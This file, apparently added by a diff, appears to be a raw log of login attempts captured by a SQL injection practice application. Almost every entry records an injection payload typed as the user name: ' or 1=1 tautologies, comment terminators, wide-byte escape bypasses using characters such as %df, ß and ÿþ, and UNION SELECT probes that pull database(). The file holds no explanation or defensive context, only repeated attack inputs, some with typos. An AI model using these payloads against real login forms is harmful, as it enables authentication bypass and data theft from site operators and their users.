@@ -1,0 +1,157 @@
+User Name:adminPassword:admin
+User Name:1Password:1
+User Name:adminPassword:admin
+User Name:Password:
+User Name:adminPassword:admin
+User Name:dumbPassword:dumb
+User Name:'Password:'
+User Name:admin %df' or 1=1Password:2
+User Name:Password:
+User Name:Password:
+User Name:admin Password:1 
+User Name:admin Password:1 
+User Name:admin Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1 --+ Password:1 
+User Name:adminß' or 1=1 --+ Password:1 
+User Name:adminß' or 1=1 --+ Password:1 
+User Name:adminß' or 1=1 --+ Password:1 
+User Name:adminß' or 1=1 --+ Password:1 
+User Name:adminß' or 1=1 --+ Password:1 
+User Name:dumb  Password:dumb 
+User Name:admin' or 1=1  Password:1 
+User Name:admin' or 1=1  Password:1 
+User Name:admin' or 1=1  Password:1 
+User Name:admin' or 1=1  Password:1 
+User Name:admin' or 1=1  Password:1 
+User Name:admin' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1  Password:1 
+User Name:adminß' or 1=1--+  Password:1 
+User Name:adminß' or 1=1--+  Password:1 
+User Name:adminß' --+  Password:1 
+User Name:adminß' --+  Password:1 
+User Name:adminÿþ' --+  Password:1 
+User Name:adminÿþ' --+  Password:1 
+User Name:adminÿþ' --+  Password:1 
+User Name:adminÿþ' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' --+  Password:1 
+User Name:adminï¿½' or 1=1 --+  Password:1 
+User Name:adminï¿½' or 1=1 --+  Password:1 
+User Name:adminï¿½' or 1=1 --+  Password:1 
+User Name:11Password:1
+User Name:%EF%BF%BD%27 or 1=1#Password:1
+User Name:adminï¿½' or 1=1 --+  Password:1 
+User Name:adminï¿½' or 1=1 --+  Password:1 
+User Name:adminï¿½' or 1=1 #  Password:1 
+User Name:adminï¿½' or 1=1 #  Password:1 
+User Name:adminï¿½' or 1=1 #  Password:1 
+User Name:adminï¿½' or 1=1 --+  Password:1 
+User Name:adminï¿½' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' union select 1,2,3 #  Password:1 
+User Name:adminÿþ' union select 1,2,3 #  Password:1 
+User Name:adminÿþ' union select 1,2,3 from *  #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' or 1=1 #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:adminÿþ' uniton select 123 #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:adminÿþ' uniton select 1,database(),3  #  Password:1 
+User Name:adminÿþ' uniton select 1,database(),3  #  Password:1 
+User Name:adminÿþ' uniton select 1,database(),3  #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:adminÿþ' uniton select 1,2,3  #  Password:1 
+User Name:ÿþ' uniton select 1,2,3  #  Password:1 
+User Name:ÿþ' uniton select 1,2,3  #  Password:1 
+User Name:ÿþ' uniton select 1,2,3  #  Password:1 
+User Name:ÿþ' uniton select 1,2,3  #  Password:1 
+User Name:ÿþ' or select  1,2,3  #  Password:1 
+User Name:ÿþ' or select 1,2,3  #  Password:1 
+User Name:ÿþ' or select 1,2,3  #  Password:1 
+User Name:ÿþ' or select 1,2,3  #  Password:1 
+User Name:ÿþ' or select 1,2,3  #  Password:1 
+User Name:ÿþ' or select 1,2,3  #  Password:1 
+User Name:ÿþ' or select 1,2,3  #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=2 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' union select 1,2,3  #  Password:1 
+User Name:-ÿþ' union select 1,2,3  #  Password:1 
+User Name:-ÿþ' union select 1,2,3  #  Password:1 
+User Name:-ÿþ' union select 1,2,3  #  Password:1 
+User Name:ÿþ' union select 1,2,3  #  Password:1 
+User Name:ÿþ' union select 1,2,3  #  Password:1 
+User Name:ÿþ' union select 1,2,3 #  Password:1 
+User Name:ÿþ' union select 1,2,3 #  Password:1 
+User Name:ÿþ' union select 1,2,3 #  Password:1 
+User Name:ÿþ' union select 1,2,3 #  Password:1 
+User Name:ÿþ' or 1=1  #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 #  Password:1 
+User Name:ÿþ' or 1=1 # Password:1 
